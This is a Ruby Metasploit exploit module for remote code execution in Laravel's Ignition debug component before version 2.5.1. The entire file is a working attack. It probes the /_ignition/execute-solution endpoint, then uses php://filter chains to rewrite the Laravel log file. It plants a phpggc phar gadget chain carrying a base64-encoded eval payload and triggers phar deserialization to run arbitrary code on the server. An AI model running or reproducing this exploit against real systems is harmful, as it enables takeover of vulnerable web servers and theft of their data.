require 'json'
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {}) 
    super(update_info(info,
      'Name' => 'Laravel Ignition RCE',
      'Description' => %q{Before the version of 2.5.1 the Ignition has code like
                            $contents = file_get_contents($parameters['viewFile']);
                            file_put_contents($parameters['viewFile'], $contents);
                            ,the attacker can use phar to unserialize
                        },
                        'Author' => [
                          'sam0ple' #Metasploit module
                        ],
                        'License' => MSF_LICENSE,
                        'Arch'=>ARCH_PHP,
                        'Platform'=>['php'],
                        'Privileged'=>false,
                        'Targets'=>[['Ignition <= 2.51',{}]]

    ))
    register_options([
      OptString.new('logfile',[true,'The log file','../storage/logs/laravel.log'])
    ])
  end

  def check
    post_data = {"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
                 "parameters":{
                   "variableName":"username",
                   "viewFile":"xxxxxx"
                 }}
    content_type = "Content-Type: application/json"
    uri = "/_ignition/execute-solution"
    res = send_request_raw(
      {
        "method"=>"POST",
        "uri"=>uri,
        "data"=>JSON.generate(post_data),
        "headers" => {
          'Content-Type': 'application/json'
        }
      }
    )
    if res.body =~ /file_get_contents/
      return Exploit::CheckCode::Appears
    end
    return Exploit::CheckCode::Detected 
  end
  
  def send_data_json(js)
    content_type = "Content-Type: application/json"
    uri = "/_ignition/execute-solution"
    res = send_request_raw(
      {
        "method"=>"POST",
        "uri"=>uri,
        "data"=>JSON.generate(js),
        "headers"=>{
          "Content-Type":"application/json"
        }
      }
    )
    res
  end
  def exploit
    print_status("Clear up the original log file")
    post_data = {"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
                   "parameters":{
                     "variableName":"username",
                     "viewFile":"xxxxxx"
                   }}
    post_data[:parameters][:viewFile] = "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=#{datastore['logfile']}"

    send_data_json(post_data)
    
    print_status("Send data to prefix the Log")
    post_data[:parameters][:viewFile] = "AA"
    send_data_json(post_data)

    print_status("Get the payload we will send")
    print_status(post_payload)
    post_data[:parameters][:viewFile] = "#{post_payload}"
    send_data_json(post_data)
    
    print_status("Clear the log file")
    post_data[:parameters][:viewFile] = "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=#{datastore['logfile']}"
    send_data_json(post_data)

    print_status("Trigger the phar unserialize")
    post_data[:parameters][:viewFile] = "phar:///var/www/storage/logs/laravel.log/test.txt"
    send_data_json(post_data)
  end

  def post_payload
    encode_payload = Rex::Text.encode_base64(payload.encode)
    command = `cd /usr/share/phpggc&&php -d "phar.readonly=0" ./phpggc Laravel/RCE5 'eval(base64_decode("#{encode_payload}"));' --phar phar -o php://output | base64 -w 0 | python3 -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper(),end='')"`
    print_status(command)
    return command + 'a'
  end
end
